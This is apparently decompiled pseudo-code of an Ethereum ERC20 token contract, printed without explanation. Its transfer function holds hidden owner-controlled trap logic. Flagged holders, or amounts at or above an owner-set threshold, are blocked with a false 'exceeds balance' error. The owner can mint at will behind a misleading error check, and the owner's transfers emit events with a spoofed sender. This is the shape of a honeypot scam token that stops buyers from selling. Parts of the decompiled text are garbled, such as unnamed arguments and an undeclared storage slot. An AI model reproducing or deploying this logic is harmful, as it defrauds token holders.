contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#
mapping of uint256 balanceOf;
mapping of uint8 stor1;
mapping of uint8 stor2;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address stor9;
uint256 stor10;
address sub_671e9921Address;
address stor12;
address sub_b14a5c6aAddress;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function sub_671e9921(?) payable {
    return sub_671e9921Address
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function sub_b14a5c6a(?) payable {
    return sub_b14a5c6aAddress
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_5265327c(?) payable {
    require calldata.size - 4 >= 32
    if sub_b14a5c6aAddress != msg.sender:
        revert with 0, '!owner'
    stor9 = arg1
}

function _mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if sub_b14a5c6aAddress != msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if arg2 + totalSupply < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if arg2 + balanceOf[stor13] < balanceOf[stor13]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor13] += arg2
    emit Transfer(arg2, 0, arg1);
}

function sub_08ec4eb5(?) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if sub_b14a5c6aAddress != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor1[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 2
        stor2[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if stor9 != sub_b14a5c6aAddress:
        if sub_b14a5c6aAddress == msg.sender:
            if msg.sender == arg1:
                stor10 = arg2
        else:
            if stor9 == msg.sender:
                if sub_b14a5c6aAddress == msg.sender:
                    if msg.sender == arg1:
                        stor10 = arg2
            else:
                if sub_b14a5c6aAddress == arg1:
                    if sub_b14a5c6aAddress == msg.sender:
                        if msg.sender == arg1:
                            stor10 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if 1 == bool(stor2[address(msg.sender)]):
                            if stor9 != msg.sender:
                                if sub_671e9921Address != arg1:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor10:
                                if stor9 != msg.sender:
                                    if sub_671e9921Address != arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor9 == arg1:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    else:
        if sub_b14a5c6aAddress == msg.sender:
            stor9 = arg1
        else:
            if stor9 == msg.sender:
                if sub_b14a5c6aAddress == msg.sender:
                    if msg.sender == arg1:
                        stor10 = arg2
            else:
                if sub_b14a5c6aAddress == arg1:
                    if sub_b14a5c6aAddress == msg.sender:
                        if msg.sender == arg1:
                            stor10 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if 1 == bool(stor2[address(msg.sender)]):
                            if stor9 != msg.sender:
                                if sub_671e9921Address != arg1:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor10:
                                if stor9 != msg.sender:
                                    if sub_671e9921Address != arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor9 == arg1:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    if stor9 != sub_b14a5c6aAddress:
        if sub_b14a5c6aAddress == msg.sender:
            if msg.sender == arg1:
                stor10 = arg2
        else:
            if stor9 == msg.sender:
                if sub_b14a5c6aAddress == msg.sender:
                    if msg.sender == arg1:
                        stor10 = arg2
            else:
                if sub_b14a5c6aAddress == arg1:
                    if sub_b14a5c6aAddress == msg.sender:
                        if msg.sender == arg1:
                            stor10 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if 1 == bool(stor2[address(msg.sender)]):
                            if stor9 != msg.sender:
                                if sub_671e9921Address != arg1:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor10:
                                if stor9 != msg.sender:
                                    if sub_671e9921Address != arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor9 == arg1:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    else:
        if sub_b14a5c6aAddress == msg.sender:
            stor9 = arg1
        else:
            if stor9 == msg.sender:
                if sub_b14a5c6aAddress == msg.sender:
                    if msg.sender == arg1:
                        stor10 = arg2
            else:
                if sub_b14a5c6aAddress == arg1:
                    if sub_b14a5c6aAddress == msg.sender:
                        if msg.sender == arg1:
                            stor10 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if 1 == bool(stor2[address(msg.sender)]):
                            if stor9 != msg.sender:
                                if sub_671e9921Address != arg1:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor10:
                                if stor9 != msg.sender:
                                    if sub_671e9921Address != arg1:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if stor9 == arg1:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if arg2 + balanceOf[arg1] < balanceOf[arg1]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    if sub_b14a5c6aAddress != msg.sender:
        emit Transfer(arg2, msg.sender, arg1);
    else:
        emit Transfer(arg2, stor12, arg1);
    return 1
}



}
